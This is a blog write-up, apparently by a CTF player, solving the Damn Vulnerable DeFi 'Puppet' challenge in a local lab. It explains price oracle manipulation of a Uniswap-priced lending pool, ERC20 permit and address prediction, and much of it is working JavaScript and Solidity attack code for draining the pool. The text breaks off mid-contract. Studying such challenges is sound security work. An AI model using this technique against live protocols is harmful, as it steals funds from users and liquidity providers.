// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n &amp;#43; tokensSold * 997n);
}

describe(&amp;#39;[Challenge] Puppet&amp;#39;, function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory(&amp;#39;DamnValuableToken&amp;#39;, deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange&amp;#39;s address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory(&amp;#39;PuppetPool&amp;#39;, deployer)).deploy(
            token.address,
            uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    it(&amp;#39;Execution&amp;#39;, async function () {
        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
        
        // Player has taken all tokens from the pool       
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, &amp;#39;Pool still has tokens&amp;#39;);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, &amp;#39;Not enough token balance in player&amp;#39;);
    });
});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Looking at the challenge description and source code, we can see that the target contract &lt;code&gt;PuppetPool&lt;/code&gt; has &lt;code&gt;100000&lt;/code&gt; DVTs (Damn Vulnerable Tokens) available for us to borrow. To borrow the DVTs, we need to provide 2 times the value in ETH as collateral. But how does the contract determine the value of DVT/ETH?&lt;/p&gt;
&lt;p&gt;The function &lt;code&gt;calculateDepositRequired(uint256 amount)&lt;/code&gt; returns the amount of ETH required to borrow &lt;code&gt;amount&lt;/code&gt; tokens. This function calls &lt;code&gt;_computeOraclePrice()&lt;/code&gt; which queries a Uniswap V1 exchange with 10 ETH and 10 DVT in liquidity. We start with &lt;code&gt;25&lt;/code&gt; ETH and &lt;code&gt;1000&lt;/code&gt; DVTs.&lt;/p&gt;
&lt;h1 id=&#34;price-oracle-manipulation&#34;&gt;Price Oracle Manipulation&lt;/h1&gt;
&lt;p&gt;We have much more ETH and DVT than the Uniswap exchange, which we can abuse to manipulate the price of DVT/ETH. For example, if we exchange all &lt;code&gt;1000&lt;/code&gt; of our DVTs for ETH in the Uniswap exchange, it will drastically increase the supply of DVTs, and reduce the supply of ETH, inflating the price of ETH.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s say we swap &lt;code&gt;1000&lt;/code&gt; DVT for &lt;code&gt;9.9&lt;/code&gt; ETH. The Uniswap exchange will have &lt;code&gt;1010&lt;/code&gt; DVT and &lt;code&gt;0.1&lt;/code&gt; ETH left, and now reports a price of roughly &lt;code&gt;1&lt;/code&gt; ETH per &lt;code&gt;10100&lt;/code&gt; DVT. As the lending pool relies on this Uniswap exchange for the price of DVT, it will use this pricing for the collateral, and we can borrow &lt;code&gt;100000&lt;/code&gt; DVT for around &lt;code&gt;20&lt;/code&gt; ETH (providing 2 times ETH for collateral), draining the pool and solving the challenge.&lt;/p&gt;
&lt;p&gt;We write a quick proof of concept to see this working in action:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
it(&amp;#39;Execution&amp;#39;, async function () {
    /** CODE YOUR SOLUTION HERE */

    console.log(&amp;#34;=== Initial balances &amp;amp; prices ===&amp;#34;)
    console.log(`ETH balance: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
    console.log(`DVT balance: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
    console.log(`Price of 1000 DVT: ${
        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
    } ETH`)
    // approve uniswapExchange to use our DVTs
    await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE)
    // swap our DVTs for ETH
    await uniswapExchange.connect(player).tokenToEthSwapInput(
        PLAYER_INITIAL_TOKEN_BALANCE, // swapping 10000 DVTs
        99n * 10n**17n, // for 9.9 ETH minimum
        (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp &amp;#43; 3600 // deadline (not important)
    )
    console.log(&amp;#34;=== After manipulation ===&amp;#34;)
    console.log(`ETH: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
    console.log(`DVT: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
    console.log(`Price of 1000 DVT: ${
        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
    } ETH`)

});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;



  &lt;img src=&#34;./img/poc.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;


&lt;p&gt;&lt;em&gt;Small note: You can see I renamed the challenge &amp;lsquo;Puppet v1&amp;rsquo; as there are 2 other challenges named &amp;lsquo;Puppet&amp;rsquo; which also get ran if I use &lt;code&gt;--grep &#39;Puppet&#39;&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As shown in the image, the price of DVT dropped significantly, allowing us to drain the lending pool with just 20 ETH (which we have enough of).&lt;/p&gt;
&lt;p&gt;However, if we do borrow the &lt;code&gt;100000&lt;/code&gt; tokens and drain the lending pool, we still don&amp;rsquo;t pass the challenge, because as discussed before, everything needs to be done in exactly 1 transaction:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=== Borrowing 100000 DVTs ===&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethRequiredToDrain&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;calculateDepositRequired&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;borrow&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// amount of DVT to borrow
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// recipient of borrowed DVTs 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    {&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethRequiredToDrain&lt;/span&gt;} &lt;span style=&#34;color:#75715e&#34;&gt;// send ETH as collateral
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Player DVTs: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;balanceOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Lending Pool DVTs: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;balanceOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;./img/fail.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;


&lt;p&gt;Solve requirement which is not met:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;provider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionCount&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;eq&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;everything-in-one-transaction&#34;&gt;Everything in one transaction&lt;/h1&gt;
&lt;p&gt;Everything should be done with only the &lt;code&gt;player&lt;/code&gt; account, so we shouldn&amp;rsquo;t create another account just to bypass this condition.&lt;/p&gt;
&lt;p&gt;To perform all of these calls; swapping tokens with the Uniswap pool, then borrowing tokens from the lending pool, we can create a contract which &lt;strong&gt;executes everything in its constructor&lt;/strong&gt;, using our 1 transaction to deploy the contract, sending all necessary ether along with it.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetAttack.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
contract PuppetAttack {
    constructor (
        address owner,
        DamnValuableToken token,
        PuppetPool lendingPool,
        IUniswapExchange uniswapExchange
    ) payable {
        // swap all our DVTs for ETH
        token.approve(address(uniswapExchange), value);
        uniswapExchange.tokenToEthSwapInput(
            1000 * 10**18, // swap 1000 DVT
            9.9 * 10**18, // for 9.9 ETH minimum
            block.timestamp &amp;#43; 3600 // deadline (not important)
        );

        // drain lending pool&amp;#39;s DVTs, sending them to owner (player)
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
            lendingPoolBalance
        );
        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
it(&amp;#39;Execution&amp;#39;, async function () {
    /** CODE YOUR SOLUTION HERE */

    attack = await (await ethers.getContractFactory(&amp;#39;PuppetAttack&amp;#39;, player)).deploy(
        player.address,
        token.address,
        lendingPool.address,
        uniswapExchange.address,
        {
            // send most ETH to the attack contract, keeping some for gas
            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
            gasLimit: 1e7
        }
    );
});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The above code will fail, however, as there is a significant problem: for the attack contract to trade our DVTs, we need to allow our DVTs to be spent by the attack contract - how can we do this without using up another transaction?&lt;/p&gt;
&lt;h1 id=&#34;erc20-permit-approvals&#34;&gt;ERC20 Permit Approvals&lt;/h1&gt;
&lt;p&gt;We can&amp;rsquo;t simply &lt;code&gt;transfer&lt;/code&gt; our tokens to the attack contract, or &lt;code&gt;approve&lt;/code&gt; the attack contract to use our tokens, without a transaction.&lt;/p&gt;
&lt;p&gt;Fortunately if we look closer at the DVT contract, we notice it uses &lt;a href=&#34;https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol&#34;&gt;solmate&amp;rsquo;s ERC20 implementation&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;solmate/src/tokens/ERC20.sol&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This particular implementation includes the &lt;code&gt;permit&lt;/code&gt; function, which was designed as a gas efficient way to &lt;code&gt;approve&lt;/code&gt; a spender. It is essentially an &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-2612&#34;&gt;extension to ERC20&lt;/a&gt; to allow others to spend your tokens &lt;strong&gt;in a single transaction&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;For example, say you wish to exchange some tokens. Normally you would need to call &lt;code&gt;approve(exchange, amount)&lt;/code&gt; to allow &lt;code&gt;exchange&lt;/code&gt; to spend &lt;code&gt;amount&lt;/code&gt; of your tokens, then the exchange can take your tokens by doing &lt;code&gt;transferFrom(you, exchange, amount)&lt;/code&gt;. This requires a total of 2 transactions, one from you and one from the exchange. &lt;strong&gt;There is no way to do both in the same transaction&lt;/strong&gt; (unless you are a contract).&lt;/p&gt;
&lt;p&gt;With &lt;code&gt;permit&lt;/code&gt;, you can cryptographically sign a &lt;code&gt;Permit&lt;/code&gt; which contains details such as the &lt;code&gt;spender&lt;/code&gt; and &lt;code&gt;amount&lt;/code&gt;, obtaining a signature. Then, you send this signature to the exchange, which calls &lt;code&gt;permit&lt;/code&gt; on the token contract, approving &lt;code&gt;spender&lt;/code&gt; to spend &lt;code&gt;amount&lt;/code&gt; tokens. The key difference is that the signing is done off-chain, which means the exchange can &lt;strong&gt;obtain allowance to your tokens and spend them in the same transaction&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;This is perfect for our scenario, as our attacking contract cannot spend our DVTs without us sending or approving the DVTs first.&lt;/p&gt;
&lt;h1 id=&#34;deterministic-contract-addresses&#34;&gt;Deterministic Contract Addresses&lt;/h1&gt;
&lt;p&gt;There is another problem - we need to specify the &lt;code&gt;spender&lt;/code&gt; when signing a permit off-chain - how do we get our attack contract&amp;rsquo;s address before deploying it?&lt;/p&gt;
&lt;p&gt;We can actually predict the contract&amp;rsquo;s address before its deployment, as &lt;a href=&#34;https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed&#34;&gt;contract addresses are deterministic&lt;/a&gt;, based off the deploying account&amp;rsquo;s address and nonce.&lt;/p&gt;
&lt;p&gt;In our case, since Hardhat tests use same account addresses, we can simply deploy and print out the attack contract&amp;rsquo;s address, which will remain constant.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;it&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Execution&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/** CODE YOUR SOLUTION HERE */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getContractFactory&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PuppetAttack&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;deploy&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Attack contract: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;contract&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PuppetAttack&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Deploying an empty contract as shown above gives us the attack contract&amp;rsquo;s address, which stays constant if we re-run the tests.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Attack contract: 0x8464135c8F25Da09e49BC8782676a84730C318bC
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;putting-it-all-together&#34;&gt;Putting it all together&lt;/h1&gt;
&lt;p&gt;Figuring out how to sign the permit probably took the longest for this challenge. I eventually found &lt;a href=&#34;https://forum.openzeppelin.com/t/erc20-permit-call/34975&#34;&gt;this thread&lt;/a&gt; and modified the code to work. Afterwards I found &lt;a href=&#34;https://github.com/dmihal/eth-permit&#34;&gt;&lt;code&gt;eth-permit&lt;/code&gt;&lt;/a&gt; which required less code, but requires installing another node module, so I will show the original way I used.&lt;/p&gt;
&lt;p&gt;Otherwise, most of the code is simply combining what was shown in the previous sections, with the addition of the permit.&lt;/p&gt;
&lt;p&gt;Final attack contract code:



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;300&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;300&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetAttack.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import &amp;#34;../DamnValuableToken.sol&amp;#34;;
import &amp;#34;./PuppetPool.sol&amp;#34;;
import &amp;#34;./IUniswapExchange.sol&amp;#34;;

/**
 * @title PuppetAttack
 * @author teddyctf (https://thesavageteddy.github.io/posts/puppet-damnvulnerabledefi/)
 */

contract PuppetAttack {
    constructor (
        address owner,
        DamnValuableToken token,
        PuppetPool lendingPool,
        IUniswapExchange uniswapExchange,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v, bytes32 r, bytes32 s
    ) payable {
        // use permit and transfer tokens to this contract
        token.permit(
            owner,
            spender,
            value,
            deadline,
